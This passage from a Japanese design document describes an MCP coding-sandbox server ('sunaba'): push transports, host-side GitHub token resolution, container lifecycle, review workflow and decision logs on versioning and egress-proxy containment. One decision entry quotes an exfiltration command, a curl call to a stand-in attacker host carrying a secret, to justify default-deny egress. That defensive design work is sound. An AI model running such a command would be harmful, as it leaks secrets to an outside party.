issue_view →(要約)→ search_in_container → read_file_range → write_file_sandbox(old_str) | transform_file → lint_in_container → type_check_in_container → verify_in_container → publish
```

issue 本文も差分もコンテナ内に留まり、LLM は run_id / ハンドル / 構造化サマリだけ運ぶ。

**スコープ境界**: 触るのはコンテナ内クローンのみ（§5 維持）。issue 一覧管理・レビュースレッド運用・projects は入れない。レビューの実行（検証・所見作成・投稿）は §14 のレビューフローに従いスコープ内。

### 11.1 コミット/プッシュの3層モデル

サンドボックス内の git 操作を3層に分ける。各ツールの docstring と挙動判断はこの節を唯一の真実源とする。

| 層 | ツール | token | verify ゲート | 境界 |
|---|---|---|---|---|
| 保存 | `checkpoint` / `checkpoint_list` | 不要 | 無し | コンテナ内 |
| 巻き戻し | `checkpoint_restore` | 不要 | 無し | コンテナ内 |
| 出口 | `publish` | 不要（ホスト側解決） | 無し（LLM が事前に verify_in_container で担保） | GitHub への push |

コンテナ内は使い捨て（§0）。保存・巻き戻し層は token もゲートも要らず、edit/verify ループ中のセーブポイントと巻き戻しに使う。ゲートの対象は境界を越える push だけ（§2.2）。

**出口（`publish`）と transport**

提出ツールは `publish` のみ。`publish` は2つの push transport を内部に持ち、外からは透過:

- 既定: `git push`（credential helper 経由）。
- フォールバック: GitHub Objects API（blob→tree→commit→ref）に `Authorization` ヘッダを直接載せて push。helper を介さないため、helper にトークンを渡せない環境でも成功する。

`git push` が認証配管の都合で失敗したとき、`publish` は自動で API push に切り替える。transport の選択は LLM に露出しない。

**transport 非依存の不変条件**

- force-push はオプトイン。フォールバック時も暗黙には force-push しない。

**checkpoint の squash**

`publish` は常に未 push の checkpoint コミットを1コミットに畳んでから push する（`squash_checkpoints` パラメータは削除済み）。squash ベースは clone/branch 時に記録した分岐点 ref を使い、デフォルトブランチ名に依存せず push を常に fast-forward に保つ。API push 経路は HEAD ツリーを単一コミット化するため、checkpoint は元から残らない。

### 11.2 ホスト側トークン解決の3経路（直交）

ホストがトークンを解決する**供給元**は3経路あり、いずれも直交。解決したトークンはコンテナには入らず、proxy の read / push ウィンドウと `publish` / `sandbox_issue_write` がホスト側で使う。常駐 HTTP（§7）で mcp-launcher 管理外でも認証を維持するために導入された。

| 経路 | 実装 | 仕組み | 用途 |
|---|---|---|---|
| 静的トークン | env 直指定 | `GITHUB_TOKEN` をそのまま注入 | 既定・最小構成 |
| GitHub App 自己管理 | `github_auth.py` | `AppTokenProvider` が Installation Token を発行・キャッシュし、daemon スレッドで定期リフレッシュ（`setup_github_app_token()`） | 秘密鍵をホストに置き、長時間常駐でも短期トークンを切らさない（PR #223） |
| トークンブローカー | `token_broker.py` | `GITHUB_TOKEN_COMMAND` / `GITHUB_TOKEN_BROKER_SERVICE` 指定時に pin 済み keystore-broker CLI で新鮮な短期トークンを mint（バイナリ pin＋SHA-256 検証＋platformdirs キャッシュ） | 秘密鍵をホストに置かない第3経路（PR #235） |

**優先順位**: `_resolve_vcs_token()` は **ブローカー mint → `AppTokenProvider`（#474）→ 静的 `GITHUB_TOKEN` / `GH_TOKEN`** の順に解決し、先に成功したものを使う。上位が失敗しても例外にはせず次の経路へ落ちる。いずれも未設定ならトークン無しで、read は匿名クローン、push は credential 無しでクリーンに失敗する。

この順序は「短命なものほど優先」という一貫した基準で決まっている: ブローカーは呼ぶたびに mint する最も短命なトークン、App Installation Token はキャッシュ＋定期リフレッシュ、静的 PAT は最も長命。push 専用ではなく、host→GitHub API の GET（`_resolve_pr_head_ref` / `issue_write`）と proxy の read 認可ウィンドウ（#419）も同じ経路を使う。

---

## 12. ベースイメージ（全部入り）

> **更新（#104 / #313）**: 単一の全部入り `docker/Dockerfile.sandbox` は廃止し、
> `docker/Dockerfile.{base,python,go}` に分割した（`docs/design-multilang-support.md` §6/§7）。
> 既定イメージは python 固定ではなく**検出ベースで選択**し、不明時は中立 `sandbox:base` に fallback する。
> 以下の表は base + 各 backend が同梱するツールの総体を示す。

ツール同梱はイメージの責務。MCP のツール数は増やさない。`docker/Dockerfile.{base,python,go}` で管理。

| カテゴリ | ツール | 用途 |
|---------|--------|------|
| 検索（字句） | `ripgrep` | `search_in_container` lexical モード |
| 検索・書換（構造） | `ast-grep` | `search_in_container` structural モード / rewrite |
| テキスト置換 | `sd` | 設定・Markdown 含む全テキスト（二次） |
| ファイル検索 | `fd` | find 代替 |
| シンボル | `ctags` | 任意（需要次第） |
| lint | `ruff` | Python lint + autofix |
| 型検査 | `pyright` | Python 型検査（mypy も可） |
| VCS | `git` / `gh` | clone / push / issue_view |
| 高速インストール | `uv` | pip 代替（タイムアウト対策） |
| JSON処理 | `jq` | テスト結果JSON等のパース補助 |

---

## 13. Dockerライフサイクル（必要最低限）

セッション（コンテナ＋FS＋run履歴）のライフサイクル操作。実装済みのツールは以下。

- `sandbox_initialize`（最重要 / 起動）: コンテナ起動。**async ラッパー**で、image pull / clone / pip install / PR checkout など低速セットアップ中に MCP progress notification を発行し、HTTP・クライアントタイムアウトでコンテナが孤立するのを防ぐ（#298）。
- `run_container_and_exec`: 起動＋実行のワンショット。
- `sandbox_exec`: 稼働コンテナでコマンド実行（`commands` / `argv` の2モード）。
- `sandbox_exec_background` / `sandbox_exec_check`: 長時間コマンドの非同期実行と完了確認。
- `sandbox_stop`: コンテナ停止・削除（未 push の checkpoint があれば警告）。
- `sandbox_list_containers` / `sandbox_attach`: 発見・再接続（#478）。出力に `idle_seconds`（最終操作からの経過時間）を含む。
- `_reap_idle_containers`: アイドルコンテナの自動回収（#480）。**デフォルトは無効。**

### 13.1 明示的な GC 方針（#480）

#478（コンテナ共有）により、コンテナがイシュー/PR のライフタイムに紐づいて長生きするようになった。以下の方針で管理する。

**1. idle 時間の可視化（既定の動作）**

`sandbox_list_containers` / `sandbox_attach` の出力に `idle_seconds`（最終 journal 操作からの経過秒数）と `last_activity_ts` を含める。デフォルトでは**表示のみ**で自動削除は行わない。

**2. opt-in TTL による自動 stop**

環境変数 `SUNABA_CONTAINER_TTL_SECONDS` に正の整数（秒）を設定すると、`_reap_idle_containers()` 呼び出し時に TTL を超えて idle のコンテナを自動停止する。デフォルトは未設定 = 無効。既存コンテナを誤って削除しないためのセーフガード。

```python
# 動作例: TTL=3600 の場合、最終操作から1時間以上経過したコンテナを停止
SUNABA_CONTAINER_TTL_SECONDS=3600
```

**3. 終端イベントでの回収規約**

PR マージ/クローズ時、対応する名前付きコンテナ（`sandbox_initialize(name="issue-N")`）は手動で `sandbox_stop` することを**規約**とする。自動化はスコープ外だが、この規約により未使用コンテナの滞留を防ぐ。

- PR クローズ → `sandbox_stop(container_id)` （force=True で checkpoint 警告を回避）
- コンテナ一覧は `sandbox_list_containers` で確認

**4. orphan reaper（#298）との関係**

既存の orphan reaper（`_reap_orphaned_init_containers`）は `initialize_complete` イベントがなく、かつ `exec` も `stop` も記録されていない**未完成の初期化コンテナ**のみを対象とする。これは #480 の idle GC とは直交する：

- orphan reaper: 途中でタイムアウトした `sandbox_initialize` の後片付け
- idle GC（#480）: 使い終わったが停止されていないコンテナの後片付け（opt-in）

両方とも「使用済みコンテナをデフォルトで自動削除しない」原則を守る。

**Dockerfile 管理**: `docker/Dockerfile.{base,python,go}` （§12 参照）。CI でダイジェスト固定タグをビルド・管理。

---

## 14. レビューフロー（Review Execution）

> **位置づけ**: PR の変更ライフサイクルにおけるレビュー実行を、sandbox のワークフローとして定義する（#475）。「レビューの管理」は GitHub MCP のまま切り替えない。

### 14.1 レビュー実行フロー（規約）

1. **新品コンテナ**で `pr=N` チェックアウト → `verify_in_container`
   - 実装に使ったコンテナを検証に再利用しない。実装中に手で入れた依存が PR に宣言されていない欠陥（works-on-my-container）をすり抜けるため。新品で verify が通ることは「PR が自己完結している」証明である。
   - shiori クローンのコピー（masuda-masuo/shiori#89）により新品コンテナの起動コストは低い。
2. 構造化 diff で変更を把握（#476）
3. 設計・経緯との突き合わせは shiori の既存検索を読み取り専用で参照（shiori 側に新機能は不要）。
4. レビュー投稿はホスト側ワンショット（#477 `sandbox_pr_review_write`）、トークンはホスト側解決（コンテナに渡さない、#414 と同パターン）。

### 14.2 ペイロードの非通過原則

diff・テスト出力などのペイロードはコンテナ内に留め、LLM には構造化所見だけ返す（§3 トークン削減・§0「全部見せない」に合致）。

### 14.3 セッション分割とモデル階層の運用規約（#481）

**中核原則**: セッションは使い捨てワーカー。状態はセッションに置かず外部化する — 合意はイシュー/PR、作業実体は共有コンテナ（#478）、監査は journal（#479）。外部化された引き継ぎ物だけが、モデル階層をまたげる唯一のインターフェース（高いモデルの会話コンテキストは安いモデルに渡せない）。

**セッション構成**:

| セッション | モデル階層 | 入力 | 出力 | コンテナ |
|---|---|---|---|---|
| 横断設計 | 高 | 課題意識 | イシュー群 | なし |
| 詳細設計 | 高 | イシュー1件 | イシューに設計を確定 | `issue-N` 作成（スパイク用） |
| 実装 | 中 | 確定イシューのみ | PR | `issue-N` に attach |
| レビュー（判断） | 高 | PR + 検証結果 + shiori 文脈 | レビュー投稿（重量タグ付き） | — |
| レビュー（検証） | 低 | PR | 構造化 verify 結果 | 新品 `pr=N`（使い捨て） |
| 修正（軽） | 低 | `fix-light` 指摘のみ | push | `issue-N` に attach |
| 修正（重） | 高 | `fix-heavy` 指摘 | イシュー更新 → 実装再入 | `issue-N` に attach |

**重量タグ**: レビュー指摘には `fix-light` / `fix-heavy` を付ける。振り分けは高いモデルがレビュー時点で行う — 安いモデルに自分の力量超えを判定させない。安いセッションは `fix-light` のみ拾う。

**エスカレーション規則**: 安いモデルが `verify_in_container` を2回落としたら打ち切り、重いルート（イシュー経由の再設計）へ回す。「安い×無限リトライ」が最も高くつく失敗モード。打ち切り閾値の妥当性は journal（#479、`session_label` によるセッション別履歴）で事後検証する。

**検証は新品コンテナ**: §14.1（#475）参照。実装コンテナの再利用は works-on-my-container 問題を生む。

**共有は「作る側」のライン**: 詳細設計スパイク → 実装 → 軽微修正が同一の `issue-N` コンテナ（`sandbox_initialize(name=...)` / `sandbox_attach`、#478、§13）を引き継ぐ。レビュー（検証）は姉妹ラインとして常に新品コンテナを使い、共有ラインには入らない。

**関連**: #475（レビュー実行のスコープ化）、#478（コンテナの命名と attach）、#479（journal セッション識別子）、#480（共有コンテナのライフサイクル方針）

### 14.4 子イシュー

- #476: 構造化 diff ツール — ファイル別サマリ＋段階開示
- #477: `sandbox_pr_review_write` — ホスト側ワンショットレビュー投稿
- #481: セッション分割×モデル階層の運用規約

---

## 15. 設計決定ログ

### #475 (2026-07-05): レビュー実行のスコープ化

**決定**: 「レビュー」を「管理」と「実行」に分割し、「実行」を sandbox のスコープに含める。

**経緯**: 従来 §1 では外部VCS の広域運用としてレビュー全体を「入れない」としていた。shiori#79 で PR head 索引化を検討したが、揮発性データの永続化コストが割に合わなかった。#414（`sandbox_issue_write`）で確立した「ホスト側ワンショット・トークンはコンテナに入れない」パターンをレビューにも拡張することで、sandbox 側の既存部品（`pr=N` チェックアウト・`verify_in_container`・`search_in_container`）を活かしたレビューフローを実現できる。

**影響**:
- masuda-masuo/shiori#79（PR head 索引化）は優先度格下げ — 揮発性データを shiori が永続化する必要が薄れた
- `docs/design.md` §1: 外部VCS の項目を「管理」と「実行」に分割
- `docs/design.md` §11: スコープ境界注記を改訂
- 新規ツール: #476（構造化 diff）/ #477（`sandbox_pr_review_write`）/ #481（運用規約）

**参照**: #414（前例: ホスト側ワンショット）、masuda-masuo/shiori#79（格下げ）

### #481 (2026-07-08): セッション分割×モデル階層の運用規約

**決定**: 開発フローを複数 LLM セッション・モデル階層（重い判断 = Fable/Opus、機械的作業 = 安価なモデル）で分担する運用を規約化した。中核原則は「セッションは使い捨てワーカー、状態はセッションに置かず外部化する」— 合意はイシュー/PR、作業実体は共有コンテナ、監査は journal。

**経緯**: #475（レビュー実行のスコープ化）・#478（コンテナ共有）・#479（journal セッション識別子）・#480（共有コンテナのライフサイクル方針）がそれぞれ独立に実装済みで、本イシューはそれらを束ねる運用規約（重量タグ・エスカレーション規則・共有ラインの定義）として起票された。4件とも実装完了済みのため、規約の文書化のみが残作業だった。

**影響**:
- `docs/design.md` §14.3: セッション構成表（横断設計〜修正まで7セッション）・重量タグ規約・エスカレーション規則・共有ラインの規約を追記
- 既存実装（#478 の `name` / `sandbox_attach`、#479 の `session_label`、#480 の idle GC）への相互参照を整理

**参照**: #475、#478、#479、#480

### #473 (2026-07-08): V1.0 リリース実務（version bump / tag / CHANGELOG / 互換性ポリシー）

**決定**: `pyproject.toml` を `1.0.0` へ bump し、README に互換性ポリシー（MCP ツール名・引数・返却形状・環境変数名は semver 対象、破壊的変更は major のみ）を宣言。あわせて `CHANGELOG.md` を新設した。

**経緯**: 契約凍結系の #467（エラー形状統一）・#468（env var 命名統一）・#469（search 返却形状変更）が本 issue のブロッカーとして先行完了済みだったため着手。着手時点で issue 本文が参照する「V1.0 棚卸しで削除したツール一覧」（#457/#458/#459/#438）は事実として正しかったが、issue 作成後に #475〜#481（レビュー実行のスコープ化とコンテナ共有）で `diff_in_container` / `sandbox_pr_review_write` / `sandbox_list_containers` / `sandbox_attach` が新設されており、README の「Available tools」表がこれら5ツールを反映していなかった（登録済みだが未記載）。契約凍結の前提となるツール一覧が不正確なままではポリシー宣言そのものが無意味なため、CHANGELOG 執筆前に README の表を `server.py` の実登録と突き合わせて修正した。

**影響**:
- `pyproject.toml`: `version = "1.0.0"`
- `README.md`: Available tools 表に5ツール追記、Compatibility policy 節を新設、Installation/Quick start に `@v1.0.0` pin 例を追記、Sandbox image 節に image_pins.json とサーバーバージョンの互換性一言メモを追記
- `CHANGELOG.md`: 新設。初版エントリは「Initial public release」の一言のみとし、README の互換性ポリシー・ツール一覧への参照だけを添えた。当初は Added（#476〜#478 起源のツール）/ Changed（#467/#468/#469 の契約変更）/ Removed（#458/#459/#438/#441 の削除）を機械的に列挙していたが、これらは一度も公開タグを打っていない `0.1.0` からの「差分」であり、比較対象となる公開済み前バージョンが存在しない。外部利用者にとっての Changed/Removed たり得ない内部開発史を CHANGELOG に持ち込んでいた（Added 節はさらに #476〜#478 起源という恣意的な直近ウィンドウの切り取りで、既存ツールの `package_install` 混入をレビューで指摘されてもいた）。開発判断の履歴は本節（design.md 決定ログ）が既に担っており、CHANGELOG は「公開後の差分」記録に徹する
- `git tag v1.0.0` の打刻はこの PR のマージ後の作業として残置（feature branch 上で打つ意味がないため）

**参照**: #467、#468、#469、#457、#458、#459、#438、#441、#475、#476、#477、#478


### #531 / #534 (2026-07-10): V1.0 の撤回、0.8.0 への再番号付け、`sunaba` へのリネーム

**決定**: #473 で宣言した `1.0.0` を撤回し、現 HEAD を `0.8.0` とする。あわせてプロジェクト名を `code-sandbox-mcp` から `sunaba`（砂場）へ変更する。README の互換性ポリシーは「0.x では破壊的変更を minor bump で行う（patch では不可）」に書き換え、契約凍結は 1.0.0 昇格時とした。

**経緯**: #473 の決定にはタグ打刻が「マージ後の作業」として残置され、実際には打たれなかった。理由は運用がまだ安定しておらず 1.0 が時期尚早と判断したためだが、`pyproject.toml` と CHANGELOG だけが `1.0.0` を名乗る状態になった。さらにその後 #509（egress proxy の default-on 化）と #506（宛先ホストの default-deny 化）で既定挙動を2度反転させており、「破壊的変更は major のみ」という宣言と実態が乖離した。#531 本文は「1.0.0 に遡及打刻して現 HEAD を 1.1.0 にする」か「現 HEAD を 1.0.0 とする」の二択を提示していたが、いずれも既に破った約束を追認する形になる。

`1.0.0` は git タグ・GHCR・PyPI のいずれにも公開されておらず、外部利用者がゼロであることを確認した（2026-07-10）。したがって「リリースされなかったもの」として撤回でき、0.x に戻せば既定反転は minor bump という semver の規約どおりの扱いになる。

リネームを同じウェーブに含めたのは、(1) PyPI の `code-sandbox-mcp` が別者に取得済みで現名では公開経路が塞がっていること、(2) 0.x は破壊的変更が許容される期間であり、1.0 昇格後にリネームすると再び major bump が必要になること、による。名前は shiori（栞）と和名で揃い、「砂場 = sandbox」の直訳で後継であることが伝わる点を採った。`hakoniwa` は Rust 製サンドボックスツールと、`kekkai` は PyPI 既存パッケージと衝突するため見送った。

**影響**:
- `pyproject.toml`: `name = "sunaba"` / `version = "0.8.0"`、console script も `sunaba`
- import パッケージ `code_sandbox_mcp` → `sunaba`、環境変数 `CODE_SANDBOX_*` → `SUNABA_*`（20個）
- **ランタイム同一性**（機械的置換では壊れる箇所）: Docker ラベル `com.code-sandbox-mcp.*` → `com.sunaba.*`、ホスト状態ディレクトリ `~/.code-sandbox-mcp/` → `~/.sunaba/`、keyring サービス名 `GITHUB_TOKEN_BROKER_SERVICE=sunaba`、Docker ネットワーク/サイドカー/ボリューム `code-sandbox-egress*` → `sunaba-egress*`。いずれも「サーバーが既存の状態を発見する鍵」であり、移行手順を踏まないと既存コンテナを見失う・トークンチェーンが切れる。CHANGELOG に移行手順を記載した
- **egress proxy サイドカーの暫定シム**: `proxy.py` / `proxy_entrypoint.py` はイメージに焼き込まれ、`proxy_pin.json` はリネーム前のダイジェストを指す。CI は `ghcr.io/${{ github.repository }}/proxy` に push するため新イメージはリネーム後にしか出ない（鶏と卵）。そこで `proxy_lifecycle.py` はホスト→サイドカー境界を越える6変数を新旧両方の名前で渡す。再 pin 後にこのシムを削除する
- `image_pins.json` / `proxy_pin.json` は旧パッケージパスのまま据え置き（ダイジェストが旧パッケージにしか存在しないため）。CI が新パッケージへ publish した後に再 pin する
- 旧名フォールバックは提供しない（利用者は自分のみ）。ただし上記サイドカー境界のみ例外

**1.0.0 昇格条件**: 以下を全て満たしたときに検討する。
1. 既定挙動の反転を伴う変更なしで4週間のドッグフーディング運用（VM・自宅機の両環境）
2. リリース毎の CHANGELOG 更新が2リリース連続で守られる（#531 の再発防止）
3. GHCR へのバージョンタグ付きイメージ発行が CI で自動化されている
4. README のインストール手順が pin どおりに新規環境で通ることを確認済み

**参照**: #531、#534、#473（本決定が上書きする決定元）、#506、#509、#517

### #495 → #506 (2026-07-07): posture A —— 封じ込めを「本物」にする

**決定**: egress proxy を「push を止める門番」から「**宛先 default-deny の封じ込め**」へ格上げする（posture A）。

**背景**: それまでの proxy は `git push` の宛先だけを見ていた。つまり proxy が ON でも、コンテナから `curl https://attacker.com/?d=$SECRET` は素通しだった（#495）。「proxy を有効にした」という運用者の認識と、実際に封じ込められている範囲が一致していない —— これは設定ミスより質が悪い。**守られていると思い込ませる防御**だからである。

**選択肢と却下理由**:
- posture B（push だけ守り、exfil は監査で拾う）: ジャーナルは事後追跡であって防御ではない。§8 の「事後監査が安全網の主役」は**コンテナ内で完結する操作**に対する方針であって、外に出ていくバイトに対する方針ではない。
- posture C（コンテナから一切のネットワークを奪う）: `pip install` / `clone` が死ぬ。使えないサンドボックスは使われず、結果として誰も proxy を使わなくなる。

**結果**: `EgressGuard.decide_host()` を導入し、組み込み既定（github/pypi/npm 系）以外の宛先を 403 で拒否。運用者は `SUNABA_ALLOWED_EGRESS_HOSTS` で**加算**のみできる（既定を設定で消せないのは意図的 —— 消せると「pip が動かない」を理由に allowlist を空にする圧力が働く）。allowlist 内ホスト経由の exfil と DNS/SNI サイドチャネルは**残る限界**として明記した（§2.3）。

**参照**: #495（posture 決定）、#506 / PR #507（実装）

### #509 (2026-07-08): egress proxy の default-on 化

**決定**: `allow_network=True` のセッションで proxy を**既定 ON** にし、`SUNABA_ENABLE_EGRESS_PROXY=false` を明示的な opt-out 経路として残す。sidecar 起動失敗時は fail-closed（`sandbox_initialize` を失敗させる）。

**背景**: #506 で封じ込めが本物になっても、proxy 自体は opt-in のままだった（PR #507 は既定を意図的に変えていない）。ユーザー判断は「**オフにするユースケースの方が少ないはず**」—— proxy を使わない積極的な理由がある方が少数派なら、既定を反転して必要な人だけ opt-out させるべきである。

**fail-closed を選んだ理由**: sidecar 起動失敗時に proxy 無しでネットワークを許可する（fail-open）と、まさに #495 が問題視した「ON のつもりが実は素通し」が再発する。全セッションが sidecar 障害で止まるリスクは受け入れる —— 止まったことは気づけるが、素通しは気づけない。**気づける失敗の方を選ぶ**。

**移行コスト**: 組み込み既定以外の宛先（go modules、cargo、社内 API 等）に依存していたセッションが、既定反転の瞬間に理由不明の 403 で壊れうる。エラーメッセージに `SUNABA_ALLOWED_EGRESS_HOSTS` / `SUNABA_ALLOWED_REPOS` のヒントを含めることで、403 から設定へ辿れるようにした（#401 の「フォールバックで隠さない」と同じ思想）。

**後続**: #519（`ALLOWED_EGRESS_HOSTS` が sidecar に渡っていなかった）、#533（sidecar が起動時 env を保持し続け、設定変更が反映されなかった）。どちらも「env → sidecar の受け渡しが起動時のみ」という同一の根に由来する。default-on 化で全ユーザーの経路上に載ったことで顕在化した。

**参照**: #509、#519、#522、#533

## まとめ

基本思想（全部見せない / 構造を返す / 人間の最終制御 / できないことの保証）を採用し、コード理解レイヤーの**自前実装（ストア・インデックスの所有）**だけを切る（CLI は可）。
人間の最終制御は、**静的ガードレール（§2）＋ 境界越え操作のトークン必須（§2.2、外部VCS含む）＋ 全実行の事後監査ジャーナル（§9）** で担保する。
payload はコンテナ内に留め、LLM は制御だけ運ぶ。
AI が暴走しても被害は使い捨てコンテナ内に留まり、ホストは常に安全。
目標は一貫して——**AIが最小限のコンテキストで最大限の判断を行える、安全なテスト・検証・提出の基盤**。
